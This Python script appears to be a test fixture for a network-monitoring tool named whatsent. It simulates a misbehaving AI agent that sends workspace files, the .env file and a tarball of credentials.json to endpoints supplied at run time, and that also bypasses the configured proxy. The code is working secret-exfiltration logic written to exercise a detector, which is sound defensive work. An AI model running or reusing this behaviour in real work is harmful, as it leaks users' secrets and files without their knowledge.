"""A simulated "AI agent" used by ``whatsent demo`` and the end-to-end test.

It misbehaves in every way whatsent should catch. Run with the canary workspace
as cwd. Uses only the standard library; all destinations are local test servers.
"""

from __future__ import annotations

import argparse
import gzip
import io
import json
import os
import socket
import ssl
import tarfile
import time
import urllib.request
from pathlib import Path


def post(url: str, body: bytes, headers: dict | None = None, context: ssl.SSLContext | None = None) -> None:
    req = urllib.request.Request(url, data=body, method="POST", headers=headers or {})
    handlers = [urllib.request.ProxyHandler()]  # reads HTTP(S)_PROXY from the environment
    if context is not None:
        handlers.append(urllib.request.HTTPSHandler(context=context))
    with urllib.request.build_opener(*handlers).open(req, timeout=10) as resp:
        resp.read()


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--api", help="model API: gets the task file and a directory listing (HTTPS, gzip)")
    ap.add_argument("--telemetry", help="telemetry endpoint: gets the .env file (plain HTTP)")
    ap.add_argument("--upload", help="sync endpoint: gets an opaque encrypted-looking blob")
    ap.add_argument("--pinned", help="endpoint reached with a pinned certificate")
    ap.add_argument("--pinned-ca")
    ap.add_argument("--direct", help="host:port reached without the proxy")
    ap.add_argument("--cache-dir", help="where to stage a workspace snapshot")
    ap.add_argument("--pace", type=float, default=0.0, help="seconds to wait before each step")
    a = ap.parse_args()
    cwd = Path.cwd()
    blob = os.urandom(300 * 1024)

    time.sleep(a.pace)
    if a.api:
        listing = [str(p.relative_to(cwd)) for p in cwd.rglob("*") if ".git" not in p.parts]
        body = gzip.compress(json.dumps({"file": (cwd / "src/app.py").read_text(),
                                         "tree": listing}).encode())
        post(a.api, body, {"Content-Type": "application/json", "Content-Encoding": "gzip"},
             ssl.create_default_context())

    time.sleep(a.pace)
    if a.telemetry:
        post(a.telemetry, json.dumps({"env": (cwd / ".env").read_text()}).encode(),
             {"Content-Type": "application/json"})

    time.sleep(a.pace)
    # A workspace snapshot staged on disk, then uploaded "encrypted" (random bytes).
    if a.cache_dir:
        cache = Path(a.cache_dir)
        cache.mkdir(parents=True, exist_ok=True)
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            tf.add(cwd / "config/credentials.json", arcname="workspace/config/credentials.json")
        (cache / "snapshot.tar.gz").write_bytes(buf.getvalue())
        (cache / "upload.bin").write_bytes(blob)
    time.sleep(a.pace)
    if a.upload:
        post(a.upload, blob, {"Content-Type": "application/octet-stream"}, ssl.create_default_context())

    time.sleep(a.pace)
    if a.pinned:
        try:
            post(a.pinned, b"pinned", context=ssl.create_default_context(cafile=a.pinned_ca))
        except Exception:
            pass

    time.sleep(a.pace)
    if a.direct:
        host, port = a.direct.rsplit(":", 1)
        with socket.create_connection((host, int(port))):
            time.sleep(1.0)


if __name__ == "__main__":
    main()
